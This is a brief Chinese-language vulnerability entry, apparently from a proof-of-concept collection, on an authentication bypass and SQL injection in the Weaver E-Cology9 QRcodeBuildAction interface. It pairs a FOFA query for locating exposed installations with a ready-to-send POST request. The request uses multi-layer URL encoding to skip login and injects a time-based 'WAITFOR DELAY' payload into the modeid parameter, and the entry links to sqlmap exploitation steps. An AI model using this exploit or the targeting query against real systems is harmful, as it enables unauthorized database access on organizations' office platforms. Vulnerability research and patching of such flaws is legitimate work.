# 泛微E-Cology9平台QRcodeBuildAction存在身份认证绕过导致SQL注入漏洞

由于泛微E-Cology9 weaver.formmode.servelt.QRcodeBuildAction接口未对用户传入的数据进行严格的校验和过滤，导致攻击者利用多层编码的方式绕过身份认证进行SQL注入。

## fofa

```javascript
 app="泛微-OA（e-cology）"
```

## poc

注入点为modeid并且每注入一次就需要更换参数值

```javascript
POST /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
 
modeid=127+WAITFOR+DELAY+'0%3a0%3a5'
```

sqlmap利用方式：https://blog.csdn.net/qq_41904294/article/details/131666128
